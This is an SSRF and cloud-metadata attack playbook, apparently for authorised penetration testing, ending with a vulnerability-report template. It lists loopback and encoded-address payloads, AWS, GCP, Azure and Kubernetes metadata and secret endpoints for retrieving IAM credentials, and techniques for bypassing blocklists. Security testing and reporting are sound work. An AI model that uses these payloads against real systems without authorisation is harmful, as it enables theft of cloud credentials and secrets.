# Offensive Playbook: Server-Side Request Forgery (SSRF) & Cloud Metadata Attacks

## 1. Overview & Attack Surface
SSRF occurs when a backend server fetches a remote resource (e.g. webhooks, profile avatar URLs, PDF generators, document importers) based on a user-supplied URL without validating against internal loopback or metadata network ranges.

## 2. Common Target Endpoints & Parameters
- Webhook registration: `/api/webhooks/subscribe` (`url`)
- URL preview / unfurl: `/api/preview?url=...`
- PDF / Image generation: `/api/export/pdf?target=...`
- Cloud storage import: `/api/import?source_url=...`

## 3. Exploitation & Cloud Metadata Probing

### A. Loopback & Localhost Access
Test if internal ports or management services are reachable:
```bash
http://127.0.0.1:8080/admin
http://localhost:6379/ (Redis)
http://0.0.0.0:80/
http://[::1]:80/
http://2130706433 (Decimal encoding for 127.0.0.1)
http://017700000001 (Octal encoding for 127.0.0.1)
```

### B. Cloud Instance Metadata Services (IMDS)
- **AWS IMDSv1**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **GCP Metadata**: `http://metadata.google.internal/computeMetadata/v1/` (Requires `Metadata-Flavor: Google` header)
- **Azure Metadata**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- **Kubernetes**: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`

### C. Bypass Techniques for Blocklists
1. **DNS Rebinding / Alternate DNS**:
   - Use `nip.io` or `sslip.io`: `http://127.0.0.1.nip.io`
2. **HTTP Redirect**:
   - Host a redirecting server that returns `302 Found` to `http://169.254.169.254/`.
3. **URL Parsing Discrepancies**:
   - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`
   - `http://foo@127.0.0.1:80@google.com/`

## 4. Verification & Reporting
1. Confirm ability to read internal service banners or cloud IAM role credentials.
2. File finding via `create_vulnerability_report`:
   - **Category**: Server-Side Request Forgery (OWASP A10:2021)
   - **CWE**: CWE-918
   - **CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (Base 8.6 High)
